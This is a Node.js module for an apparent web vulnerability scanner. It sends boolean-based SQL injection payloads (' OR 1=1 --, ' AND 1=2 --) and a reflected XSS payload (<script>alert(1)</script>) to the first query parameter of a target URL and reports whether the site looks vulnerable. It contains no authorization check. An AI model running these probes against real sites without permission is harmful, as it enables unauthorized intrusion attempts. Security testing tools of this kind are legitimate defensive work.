const normalizeTarget = (target) => {
    try {
        const url = new URL(target);
        return url.hostname;
    } catch {
        return target.replace(/^https?:\/\//, "");
    }
};
const axios = require("axios");

// ----------------------
// EXTRACT PARAMS
// ----------------------
const extractParams = (url) => {
    try {
        const u = new URL(url);
        return [...u.searchParams.entries()].map(([key, value]) => ({ key, value }));
    } catch {
        return [];
    }
};

// ----------------------
// SQLi ATTACK (FAST + SINGLE PATH)
// ----------------------
const runSQLi = async (target, links = []) => {
    target = normalizeTarget(target);
    const payloadPair = {
        truePayload: "' OR 1=1 --",
        falsePayload: "' AND 1=2 --"
    };

    let paths = links.filter(l => l.includes("?"));

    // 🔥 FORCE ONLY ONE PATH
    paths = paths.length ? [paths[0]] : [`http://${target}/?id=1`];

    const baseUrl = paths[0].startsWith("http")
        ? paths[0]
        : `http://${target}${paths[0].startsWith("/") ? "" : "/"}${paths[0]}`;

    console.log("BASE URL:", baseUrl);

    const params = extractParams(baseUrl).slice(0, 1); // 🔥 only 1 param

    const requests = params.map(param => {

        const trueUrl = new URL(baseUrl);
        const falseUrl = new URL(baseUrl);

        trueUrl.searchParams.set(param.key, param.value + payloadPair.truePayload);
        falseUrl.searchParams.set(param.key, param.value + payloadPair.falsePayload);

        console.log("🧪 TRUE:", trueUrl.toString());
        console.log("🧪 FALSE:", falseUrl.toString());

        return Promise.all([
            axios.get(trueUrl.toString(), { timeout: 1200, validateStatus: () => true }),
            axios.get(falseUrl.toString(), { timeout: 1200, validateStatus: () => true })
        ])
        .then(([trueRes, falseRes]) => {
            if (trueRes.data.toString() !== falseRes.data.toString()) {
                return {
                    type: "sqli",
                    vulnerable: true,
                    technique: "boolean-based",
                    payload: payloadPair.truePayload,
                    param: param.key,
                    target
                };
            }
            return null;
        })
        .catch(() => null);
    });

    const results = await Promise.all(requests);
    const found = results.find(r => r);

    if (found) return found;

    return { type: "sqli", vulnerable: false, target };
};

// ----------------------
// XSS ATTACK (FAST + SINGLE PATH)
// ----------------------
const runXSS = async (target, links = []) => {
    target = normalizeTarget(target);
    const payload = "<script>alert(1)</script>";

    let paths = links.filter(l => l.includes("?"));

    // 🔥 FORCE ONLY ONE PATH
    paths = paths.length ? [paths[0]] : [];

    if (!paths.length) {
        return { type: "xss", vulnerable: false, target };
    }

    const baseUrl = paths[0].startsWith("http")
        ? paths[0]
        : `http://${target}${paths[0].startsWith("/") ? "" : "/"}${paths[0]}`;

    console.log("🌐 XSS BASE:", baseUrl);

    const params = extractParams(baseUrl).slice(0, 1); // 🔥 only 1 param

    const requests = params.map(param => {

        const testUrl = new URL(baseUrl);
        testUrl.searchParams.set(param.key, payload);

        console.log(`🧪 XSS Testing [${param.key}]:`, testUrl.toString());

        return axios.get(testUrl.toString(), {
            timeout: 1200,
            validateStatus: () => true
        })
        .then(res => {
            const body = res.data.toString().toLowerCase();

            if (body.includes(payload.toLowerCase())) {
                return {
                    type: "xss",
                    vulnerable: true,
                    payload,
                    param: param.key,
                    target
                };
            }

            return null;
        })
        .catch(() => null);
    });

    const results = await Promise.all(requests);
    const found = results.find(r => r);

    if (found) return found;

    return { type: "xss", vulnerable: false, target };
};

// ----------------------
// MAIN EXECUTOR (PARALLEL)
// ----------------------
const executeAttacks = async (actions, target, links = []) => {

    const promises = [];

    for (let act of actions) {
        if (act.type === "sqli") promises.push(runSQLi(target, links));
        if (act.type === "xss") promises.push(runXSS(target, links));
    }

    return Promise.all(promises);
};

module.exports = executeAttacks;